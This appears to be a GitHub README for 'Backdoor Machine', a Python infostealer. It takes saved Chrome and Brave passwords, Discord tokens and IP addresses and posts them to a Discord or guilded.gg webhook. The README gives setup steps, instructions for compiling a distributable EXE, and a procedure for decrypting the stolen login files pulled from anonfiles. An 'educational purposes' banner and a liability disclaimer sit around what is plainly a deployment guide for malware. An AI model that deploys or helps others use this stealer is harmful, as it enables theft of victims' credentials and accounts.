# Backdoor Machine - ❗For educational purposes only❗
![GitHub last commit](https://img.shields.io/github/last-commit/CUPZYY/Backdoor-Machine?style=for-the-badge)
![GitHub repo size](https://img.shields.io/github/repo-size/CUPZYY/Backdoor-Machine?style=for-the-badge)
![Lines of code](https://img.shields.io/tokei/lines/github/CUPZYY/Backdoor-Machine?style=for-the-badge)
![version](https://img.shields.io/badge/version-v1.4.1-blue?style=for-the-badge)

A program made in python for stealing passwords and usernames from Google Chrome/Brave and tokenlog the user's discord.
It will send a message in a webhook, with all the tokens, login info, ip and so on.

## How to use
1. Download the latest release.
2. Install the requirements:
   ```
   pip install requests
   pip install pywin32
   pip install pycryptodome
   ```
3. Make a webhook in a discord server/guilded.gg server.
4. Copy the webhook url into webhook.txt
5. Run the code or something.

## Compile for distribution (EXE)
1. Install pyinstaller:
   ```
   pip install pyinstaller
   ```
2. Make a webhook.
3. Copy the webhook url into webhook.txt
4. Run the file "build.py"
5. When its done, go into the "dist" directory and exe should be in there.

![alt text](https://i.imgur.com/LmL7iF8.png)

## Decrypt the user data from the .enc file
You can turn off encryption in main.py by setting encrypt_loginInfo to False in the Config section(not recommended).
1. Download the login info file from the anonfiles url, and put it in the directory of Backdoor Machine.
2. Run decrypt.py, and you will get prompted for the path to the file you just downloaded.
3. Type the name of the file you downloaded(for instance, bravelogin.enc), and press enter.
4. Then on the next prompt, paste in the decryption key for the file(found in the embed).
5. It will then output a file with the pure login information from google chrome or brave browser.

## Legal disclaimer:

Usage of Backdoor Machine for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.

## A message to github
This software is not ment to be used maliciously in any way. I just made this for fun and published it on github so that other people can use the code that I wrote.
